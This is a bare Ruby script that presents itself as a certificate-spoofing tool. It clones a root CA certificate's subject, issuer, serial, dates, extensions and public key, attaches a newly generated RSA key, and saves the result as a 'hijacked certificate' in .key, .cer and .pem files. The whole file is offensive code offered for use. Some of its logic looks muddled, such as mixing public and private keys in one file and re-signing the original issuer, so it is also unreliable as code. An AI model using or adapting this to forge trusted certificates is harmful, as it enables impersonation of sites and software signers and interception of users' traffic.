require 'rubygems'
require 'openssl'
require 'digest/md5'
key = OpenSSL::PKey::RSA.new(2048)
cipher = OpenSSL::Cipher::AES.new(256, :CBC)
ctx = OpenSSL::SSL::SSLContext.new
puts "Spoof must be in DER format and saved as root.cer"
raw = File.read "root.cer"
cert = OpenSSL::X509::Certificate.new raw
cert.version = 2
ef = OpenSSL::X509::ExtensionFactory.new
ef.issuer_certificate = OpenSSL::X509::Certificate.new raw
cert.subject = ef.issuer_certificate.subject
ef.subject_certificate = ef.issuer_certificate
cert.issuer = ef.issuer_certificate.issuer
cert.serial = ef.issuer_certificate.serial
ctx.key = ef.issuer_certificate.public_key
cert.public_key = ef.issuer_certificate.public_key
cert.not_after = ef.issuer_certificate.not_after
cert.not_before = ef.issuer_certificate.not_before
cert.extensions = ef.issuer_certificate.extensions
a = File.open("root"".key", "w")
a.syswrite("#{cert.public_key}")
a.syswrite("#{key.to_pem}")
spoof = OpenSSL::PKey::RSA.new File.read 'root.key'
printf "Verifying Keys Work: "
puts spoof.private?
ctx.cert = ef.issuer_certificate
puts "============================================================="
root = ef.issuer_certificate.sign(spoof, OpenSSL::Digest::SHA1.new)
filer = File.open("#{cert.serial}"".key", "w")
filer.syswrite("#{spoof.to_pem}")
file = File.open("spoof"".cer", "w")
file.syswrite("#{cert.to_der}")
files = File.open("#{cert.serial}"".pem", "w")
files.syswrite("#{cert.to_pem}")
files.syswrite("#{spoof.to_pem}")
puts "Hijacked Certificate with chainloaded key saved @ #{cert.serial}.pem"
printf "Verifying Keys Intergity: "
puts root.verify(key)
